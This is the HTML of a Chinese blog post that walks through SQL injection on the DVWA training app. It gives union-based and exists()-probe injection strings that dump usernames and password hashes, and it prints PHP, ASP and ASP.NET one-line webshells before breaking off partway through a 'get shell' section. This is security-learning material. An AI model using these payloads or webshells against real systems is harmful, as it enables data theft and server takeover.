@@ -1,0 +1,1122 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Dvwa-SQLInject | ZJR&#39;blog</title>
+  <meta name="keywords" content=" SQLInject ">
+  <meta name="description" content="Dvwa-SQLInject | ZJR&#39;blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="跨站脚本（Cross Site Scripting）攻击，没有对web前端的输入边界进行严格的过滤是SXX漏洞形成的主要原因攻击者可以通过构造脚本语句使得输入的内容被当作HTML的一部分来执行，当用户访问到该页面时，就会触发该恶意脚本，从而获取用户的敏感数据（比如cookie数据）XSS漏洞发生在web前端，主要对网站用户造成危害，并不会直接危害服务器后台数据 XSS类型：  反射型XSS：通过X">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dvwa-XSS">
+<meta property="og:url" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/index.html">
+<meta property="og:site_name" content="ZJR&#39;blog">
+<meta property="og:description" content="跨站脚本（Cross Site Scripting）攻击，没有对web前端的输入边界进行严格的过滤是SXX漏洞形成的主要原因攻击者可以通过构造脚本语句使得输入的内容被当作HTML的一部分来执行，当用户访问到该页面时，就会触发该恶意脚本，从而获取用户的敏感数据（比如cookie数据）XSS漏洞发生在web前端，主要对网站用户造成危害，并不会直接危害服务器后台数据 XSS类型：  反射型XSS：通过X">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/1.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/2.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/3.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/4.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/5.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/6.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/7.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/8.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/9.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/10.png">
+<meta property="article:published_time" content="2020-03-30T10:02:16.000Z">
+<meta property="article:modified_time" content="2020-03-30T10:13:14.274Z">
+<meta property="article:author" content="ZJR">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/1.png">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>ZJR</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+        <a title="github" href="https://github.com/zjr-g" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:zjre@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1402576652&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章</div></li>
+    
+        
+            
+            <li><div data-rel="Tips">Tips</div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="CTF">CTF</div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="DVWA">DVWA</div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="MySqlCourse">MySqlCourse</div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="35">
+<input type="hidden" id="yelog_site_word_count" value="53.5k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color1">aes加密</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">base64</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">ctf-web</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">BruteForce</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">CSPBypass</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">CSRF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">CommandInject</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">FileInclude</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">FileUpload</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">InsecureCAPTCHA</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">JavaScript</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">SQLInject</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">XSS</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">WeakSessionIDs</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Git</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">file_incloude</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">MySql_show</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">MySql_where</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">MySql_like</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_select</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">MySql_order by</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_regexp</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_concat</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">MySql_function</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">MySql_group by</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_having</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">MySql_subquery</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">MySql_jion</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">MySql_union</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_create</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">MySql_alter</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_insert</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_update</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_delete</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">SSIT</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Markdown</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">zip</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">hexo</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="Tips "
+           href="/2020/02/18/Aes/"
+           data-tag="aes加密"
+           data-author="" >
+            <span class="post-title" title="Aes加密解析">Aes加密解析</span>
+            <span class="post-date" title="2020-02-18 11:13:30">2020/02/18</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/02/11/Base64/"
+           data-tag="base64"
+           data-author="" >
+            <span class="post-title" title="神奇的Base64隐写">神奇的Base64隐写</span>
+            <span class="post-date" title="2020-02-11 21:01:02">2020/02/11</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/02/28/CTF-web-01/"
+           data-tag="ctf-web"
+           data-author="" >
+            <span class="post-title" title="CTF-web-01">CTF-web-01</span>
+            <span class="post-date" title="2020-02-28 20:11:44">2020/02/28</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/03/03/CTF-web-02/"
+           data-tag="ctf-web"
+           data-author="" >
+            <span class="post-title" title="CTF-web-02">CTF-web-02</span>
+            <span class="post-date" title="2020-03-03 22:48:14">2020/03/03</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/03/03/CTF-web-03/"
+           data-tag="ctf-web"
+           data-author="" >
+            <span class="post-title" title="CTF-web-03">CTF-web-03</span>
+            <span class="post-date" title="2020-03-03 22:52:30">2020/03/03</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/03/13/CTF-web-04/"
+           data-tag="ctf-web"
+           data-author="" >
+            <span class="post-title" title="CTF-web-04">CTF-web-04</span>
+            <span class="post-date" title="2020-03-13 15:33:04">2020/03/13</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-BruteForce/"
+           data-tag="BruteForce"
+           data-author="" >
+            <span class="post-title" title="Dvwa-BruteForce">Dvwa-BruteForce</span>
+            <span class="post-date" title="2020-03-30 10:41:17">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-CSPBypass/"
+           data-tag="CSPBypass"
+           data-author="" >
+            <span class="post-title" title="Dvwa-CSPBypass">Dvwa-CSPBypass</span>
+            <span class="post-date" title="2020-03-30 17:55:13">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-CSRF/"
+           data-tag="CSRF"
+           data-author="" >
+            <span class="post-title" title="Dvwa-CSRF">Dvwa-CSRF</span>
+            <span class="post-date" title="2020-03-30 17:58:21">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-CommandInject/"
+           data-tag="CommandInject"
+           data-author="" >
+            <span class="post-title" title="Dvwa-CommandInject">Dvwa-CommandInject</span>
+            <span class="post-date" title="2020-03-30 17:45:20">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-FileInclude/"
+           data-tag="FileInclude"
+           data-author="" >
+            <span class="post-title" title="Dvwa-FileInclude">Dvwa-FileInclude</span>
+            <span class="post-date" title="2020-03-30 18:01:08">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-FileUpload/"
+           data-tag="FileUpload"
+           data-author="" >
+            <span class="post-title" title="Dvwa-FileUpload">Dvwa-FileUpload</span>
+            <span class="post-date" title="2020-03-30 18:01:16">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-InsecureCAPTCHA/"
+           data-tag="InsecureCAPTCHA"
+           data-author="" >
+            <span class="post-title" title="Dvwa-InsecureCAPTCHA">Dvwa-InsecureCAPTCHA</span>
+            <span class="post-date" title="2020-03-30 18:01:32">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-JavaScript/"
+           data-tag="JavaScript"
+           data-author="" >
+            <span class="post-title" title="Dvwa-JavaScript">Dvwa-JavaScript</span>
+            <span class="post-date" title="2020-03-30 18:01:47">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-SQLInject/"
+           data-tag="SQLInject"
+           data-author="" >
+            <span class="post-title" title="Dvwa-SQLInject">Dvwa-SQLInject</span>
+            <span class="post-date" title="2020-03-30 18:01:58">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-XSS/"
+           data-tag="XSS"
+           data-author="" >
+            <span class="post-title" title="Dvwa-XSS">Dvwa-XSS</span>
+            <span class="post-date" title="2020-03-30 18:02:16">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-WeakSessionIDs/"
+           data-tag="WeakSessionIDs"
+           data-author="" >
+            <span class="post-title" title="Dvwa-WeakSessionIDs">Dvwa-WeakSessionIDs</span>
+            <span class="post-date" title="2020-03-30 18:02:09">2020/03/30</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/02/18/Git/"
+           data-tag="Git"
+           data-author="" >
+            <span class="post-title" title="Git">Git</span>
+            <span class="post-date" title="2020-02-18 19:47:13">2020/02/18</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/02/28/FileIncloude/"
+           data-tag="file_incloude"
+           data-author="" >
+            <span class="post-title" title="FileIncloude(常见的文件包含漏洞及PHP伪协议分析)">FileIncloude(常见的文件包含漏洞及PHP伪协议分析)</span>
+            <span class="post-date" title="2020-02-28 20:56:42">2020/02/28</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/01/31/MySql-Course01/"
+           data-tag="MySql_show"
+           data-author="" >
+            <span class="post-title" title="MySql(连接，创建等操作)">MySql(连接，创建等操作)</span>
+            <span class="post-date" title="2020-01-31 21:02:14">2020/01/31</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/02/MySql-Course03/"
+           data-tag="MySql_where,MySql_like"
+           data-author="" >
+            <span class="post-title" title="MySql(数据过滤)">MySql(数据过滤)</span>
+            <span class="post-date" title="2020-02-02 10:55:26">2020/02/02</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/01/MySql-Course02/"
+           data-tag="MySql_select,MySql_order by"
+           data-author="" >
+            <span class="post-title" title="MySql(select的使用)">MySql(select的使用)</span>
+            <span class="post-date" title="2020-02-01 11:12:32">2020/02/01</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/03/MySql-Course04/"
+           data-tag="MySql_regexp"
+           data-author="" >
+            <span class="post-title" title="MySql(正则表达式)">MySql(正则表达式)</span>
+            <span class="post-date" title="2020-02-03 11:22:09">2020/02/03</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/03/MySql-Course05/"
+           data-tag="MySql_concat"
+           data-author="" >
+            <span class="post-title" title="MySql(字符拼接)">MySql(字符拼接)</span>
+            <span class="post-date" title="2020-02-03 18:24:11">2020/02/03</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/04/MySql-Course06/"
+           data-tag="MySql_function"
+           data-author="" >
+            <span class="post-title" title="MySql(函数)">MySql(函数)</span>
+            <span class="post-date" title="2020-02-04 10:33:02">2020/02/04</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/05/MySql-Course07/"
+           data-tag="MySql_group by,MySql_having"
+           data-author="" >
+            <span class="post-title" title="MySql(数据分组)">MySql(数据分组)</span>
+            <span class="post-date" title="2020-02-05 09:49:48">2020/02/05</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/05/MySql-Course08/"
+           data-tag="MySql_subquery"
+           data-author="" >
+            <span class="post-title" title="MySql(子查询)">MySql(子查询)</span>
+            <span class="post-date" title="2020-02-05 11:04:05">2020/02/05</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/06/MySql-Course09/"
+           data-tag="MySql_jion"
+           data-author="" >
+            <span class="post-title" title="MySql(联结)">MySql(联结)</span>
+            <span class="post-date" title="2020-02-06 16:59:41">2020/02/06</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/07/MySql-Course10/"
+           data-tag="MySql_union"
+           data-author="" >
+            <span class="post-title" title="MySql(组合查询UNION)">MySql(组合查询UNION)</span>
+            <span class="post-date" title="2020-02-07 11:37:50">2020/02/07</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/08/MySql-Course12/"
+           data-tag="MySql_create,MySql_alter"
+           data-author="" >
+            <span class="post-title" title="MySql(创建和操纵表)">MySql(创建和操纵表)</span>
+            <span class="post-date" title="2020-02-08 10:54:47">2020/02/08</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/07/MySql-Course11/"
+           data-tag="MySql_insert,MySql_update,MySql_delete"
+           data-author="" >
+            <span class="post-title" title="MySql(增删改)">MySql(增删改)</span>
+            <span class="post-date" title="2020-02-07 12:36:57">2020/02/07</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/02/28/SSIT-Inject/"
+           data-tag="SSIT"
+           data-author="" >
+            <span class="post-title" title="SSIT-Inject">SSIT-Inject</span>
+            <span class="post-date" title="2020-02-28 20:52:27">2020/02/28</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/01/23/StudyM/"
+           data-tag="Markdown"
+           data-author="" >
+            <span class="post-title" title="LearnMarkdown">LearnMarkdown</span>
+            <span class="post-date" title="2020-01-23 00:45:22">2020/01/23</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/02/11/Zip/"
+           data-tag="zip"
+           data-author="" >
+            <span class="post-title" title="Zip结构及其伪加密">Zip结构及其伪加密</span>
+            <span class="post-date" title="2020-02-11 21:03:24">2020/02/11</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/01/24/hexo-tips-01/"
+           data-tag="hexo"
+           data-author="" >
+            <span class="post-title" title="hexo中插入本地图片">hexo中插入本地图片</span>
+            <span class="post-date" title="2020-01-24 10:13:53">2020/01/24</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-Dvwa-SQLInject" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Dvwa-SQLInject</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="DVWA">DVWA</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color5">SQLInject</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-03-30 18:12:51'>2020-03-30 18:01</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:2.9k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLInject漏洞"><span class="toc-text">SQLInject漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MYSQL知识点"><span class="toc-text">MYSQL知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入类型"><span class="toc-text">SQL注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#数字型"><span class="toc-text">数字型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符型"><span class="toc-text">字符型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#搜索型"><span class="toc-text">搜索型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开撸Low级别"><span class="toc-text">开撸Low级别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#手工开撸之获取数据"><span class="toc-text">手工开撸之获取数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#手工开撸之get-shell"><span class="toc-text">手工开撸之get shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用burp-suite破解表名"><span class="toc-text">使用burp suite破解表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap的简单使用"><span class="toc-text">sqlmap的简单使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注"><span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql注入防范措施"><span class="toc-text">sql注入防范措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码审计"><span class="toc-text">代码审计</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium级别"><span class="toc-text">medium级别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#high级别"><span class="toc-text">high级别</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="SQLInject漏洞"><a href="#SQLInject漏洞" class="headerlink" title="SQLInject漏洞"></a>SQLInject漏洞</h2><p>注入漏洞，主要指数据库注入漏洞<br>数据库注入漏洞，主要是开发人员在构建代码时，没有对输入边界进行过滤或过滤不足，导致攻击者可以通过合法的输入点提交一些精心构造的语句，从而欺骗后台数据库对其进行执行，导致数据库信息泄露的一种漏洞。</p>
+<p>攻击流程：</p>
+<ul>
+<li>注入点发现<ul>
+<li>主动方式：直接使用工具扫描</li>
+<li>手动构造sql语句（需要经验）</li>
+</ul>
+</li>
+<li>获取信息<ul>
+<li>环境信息：数据库类型、数据库版本、操作系统版本、用户信息</li>
+<li>数据库信息：数据库名称、数据库表、表字段、字段内容</li>
+</ul>
+</li>
+<li>获取权限<ul>
+<li>获取操作系统权限：通过数据库执行shell，上传木马</li>
+</ul>
+</li>
+</ul>
+<h2 id="MYSQL知识点"><a href="#MYSQL知识点" class="headerlink" title="MYSQL知识点"></a>MYSQL知识点</h2><p><font color=red>#</font> 字符到行尾<br>select xxx; #This is a note.<br><font color=red>–</font> 字符到行尾，注意<code>--</code>第二个破折号后至少跟一个空格符<br>select xxx; – This is a note.<br><font color=red>/<em><em>/</font> 多行注释<br>select x/\</em>This is a note.</em>/xx;</p>
+<p><font color=red>order by x</font>对查询结果进行排序，按照第x列进行排序，默认数字0-9，字母a-z。<br>如果查询出来的结果有2列，说明这个语句查询了两个字段</p>
+<p><font color=red>select version();</font>获取数据库版本<br><font color=red>select database();</font>获取当前数据库<br><font color=red>select user();</font>获取当前登录的用户<br><font color=red>select @@global.version_compile_os from mysql.user;</font>获取操作系统类型</p>
+<p><font color=red>select xxx into outfile “c:\\xxx\\y.php”;</font>利用into outfile这两关键字，可以将xxx写入到计算机上的文件里去，若不存在这个文件则会自动创建这个文件，并将内容写入双斜杠是为了转义</p>
+<h2 id="SQL注入类型"><a href="#SQL注入类型" class="headerlink" title="SQL注入类型"></a>SQL注入类型</h2><h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><p>例：user_id=$id</p>
+<p>注入点判断：<code>http://wwww.xxx.com/?id=1</code><br>提交1正常<br>select * from tablename where id=1;<br>提交1 and 1=1<br>select * from tablename where id=<font color=red>1 and 1=1</font>;<br>提交1 and 1=2<br>select * from tablename where id=<font color=red>1 and 1=2</font>;<br>单引号测试’<br>select * from tablename where id=<font color=red>‘</font>;</p>
+<h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>例：user_id=’$id’</p>
+<p>注入点判断：<code>http://wwww.xxx.com/?id=2</code><br>提交2正常<br>select * from tablename where id=’2’;<br>提交2 and 1=1<br>select * from tablename where id=’<font color=red>2 and 1=1</font>‘;<br>提交2’ and 1=1–<br>select * from tablename where id=’<font color=red>2’ and 1=1–</font>‘;<br>提交2’ and 1=2–<br>select * from tablename where id=’<font color=red>2’ and 1=2–</font>‘;<br>单引号测试’<br>select * from tablename where id=’<font color=red>‘</font>‘;</p>
+<h3 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h3><p>例：text LIKE ‘%{$_GET[‘search’]}%’</p>
+<p>注入点判断：<code>http://wwww.xxx.com/search.php?search=1</code></p>
+<p>提交1正常<br>select * from comment where comment_tex like ‘%1%’;<br>提交1%’ and 1=1– 或 1%’ and ‘%1%’ = ‘%2<br>select * from comment where comment_tex like ‘%<font color=red>1%’ and 1=1–</font>%’;<br>select * from comment where comment_tex like ‘%<font color=red>1%’ and ‘%1%’ = ‘%2</font>%’;</p>
+<p>总的来说：对sql中的各种类型的输入进行闭合测试，构造合法sql语句，欺骗后台执行。</p>
+<h2 id="开撸Low级别"><a href="#开撸Low级别" class="headerlink" title="开撸Low级别"></a>开撸Low级别</h2><p>利用dvwa进行学习的内容</p>
+<h3 id="手工开撸之获取数据"><a href="#手工开撸之获取数据" class="headerlink" title="手工开撸之获取数据"></a>手工开撸之获取数据</h3><p><img src="1.png" alt="1"><br>经过简单测试发现这是字符型注入</p>
+<p>为了获取更多信息我们可以进行<br>UNION联合查询，联合查询的时候<strong>列数需要和主查询相同</strong>。<br>这时我们需要使用order by来确认主查询的列，就能利用union构造对应的查询。</p>
+<p>经过前面的查询结果发现，有first name和surname两个输出结果<br>我们可以由此进行推测，这个表的查询列可能只有两个字段，查询语句类似于<strong>select firstname,surname from users where id=’x’;</strong>。使用order by进行验证。</p>
+<p>构造语句1’ order by 2#<br><img src="2.png" alt="2"><br>再构造语句1’ order by 3#<br><img src="3.png" alt="3"><br>列数位3时报错，我们推测的没错这个表只有两个字段</p>
+<p>接下来就可以进行union联合查询了，,<font color=red>select 字段1,字段2 from users where id=’1’ union select 字段1,字段2</font><br>我们先输入一个条件不成立的查询（或空条件），使得前面查询结果空，然后使用union select 1,2进行求值<br>这样first name和surname就会显示求值的内容<br><img src="4.png" alt="4"><br>这里-1就是一个不成立的查询，当然我们也可以使用<font color=red>1’ and 1=2 union select 1,2#;</font>等等。<br>回显确实如预期在first name回显了1，surname回显了2</p>
+<p>然后，我们就能更进一步啦，获取数据库版本，当前数据库名，当前登录用户等等<br><img src="5.png" alt="5"><br>得到数据库名位dvwa，用户是root@localhost<br><img src="6.png" alt="6"><br>得到数据库版本和操作系统类型</p>
+<p>下一步进行数据库的表（一般为用户表）名和列名猜解（一般为用户名和密码列）<br>构造<font color=red>1’ and exists(select * from a)#</font><br>报错信息为<code>Table &#39;dvwa.a&#39; doesn&#39;t exist</code>，就是这个表没有创建，所以dvwa数据库中不存在a这个表<br>常见表名：admin、user、users<br>接着构造<font color=red>1’ and exists(select * from users)#</font><br><img src="7.png" alt="7"><br>正常回显，说明存在这个表<br>在得到表名后就能对列名进行猜解，对列名的猜解与表名类似。根据之前得到的信息，我们猜测users这个表存在first_name这个列名<br>构造<font color=red>1’ and exists(select first_name from users)#</font><br>返回页面正常，说明存在这个列。<br>不断循环这些操作，得到需要的列名</p>
+<p>这里我们假设已经获得了我们所需的列名first_name和password，接下来继续查询信息<br>构造<font color=red>-1’ union select first_name,password from users;#</font><br><img src="8.png" alt="8"><br>这里我们就得到了用户名和对应的密码了，但密码是经过md5加密的，可以利用在线工具去破解</p>
+<h3 id="手工开撸之get-shell"><a href="#手工开撸之get-shell" class="headerlink" title="手工开撸之get shell"></a>手工开撸之get shell</h3><p>知识补充：一句话木马<br>一句话木马是一种短小精悍的木马客户端，隐蔽性号，功能强大<br>例：<br>php:&lt;?php @eval($_POST[‘cmd’])?&gt;<br>asp:&lt;%eval request(‘cmd’)%&gt;<br>asp.net:&lt;%@ Page Language=’Jscript’%&gt;&lt;%eval(Request.Item[‘cmd’],’unsafe’);%&gt;</p>
+<p>连接工具可以用中国菜刀，中国蚁剑等等</p>
